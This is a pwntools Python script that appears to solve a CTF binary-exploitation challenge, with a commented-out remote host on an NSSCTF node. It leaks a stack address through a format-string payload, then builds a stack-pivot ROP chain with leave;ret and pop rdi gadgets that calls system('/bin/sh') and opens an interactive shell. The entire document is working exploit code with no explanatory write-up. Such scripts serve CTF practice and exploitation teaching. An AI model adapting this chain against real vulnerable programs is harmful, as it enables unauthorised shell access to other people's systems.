from pwn import *

io = process('./pwn')
#io = remote('node4.anna.nssctf.cn', 28031)
elf = ELF('./pwn')
context(arch='amd64', os='linux', log_level='debug')

io.recvuntil(b'name: \n')

fmtpayload = b'%16$p'
io.send(fmtpayload)
io.recvuntil(b'hello,0x')

old_rbp = int(io.recv(12),16)

log.success('RBP Addr: ' + (hex(old_rbp)))

leave_ret = 0x4007F2
rdi = 0x4008D3
system = elf.plt['system']

Target_Addr = old_rbp - 0x60 - 0x08

# RDI will pop binsh addr as system's arg
# Offset : 0x08
Payload = p64(rdi)
# Offset : 0x08 + 0x08
Payload += p64(Target_Addr + 0x8 + 0x18)
# Offset : 0x08 + 0x10
Payload += p64(system)
# Offset : 0x08 + 0x18
Payload += b'/bin/sh\x00'
# Fill the Payload to 0x50.
Payload = Payload.ljust(0x50, b'a')
# The Leave Ret cmd's ret addr.
Payload += p64(Target_Addr)
# The Leave Ret
Payload += p64(leave_ret)

io.recvuntil(b'keep on !\n')
io.send(Payload)

io.interactive()
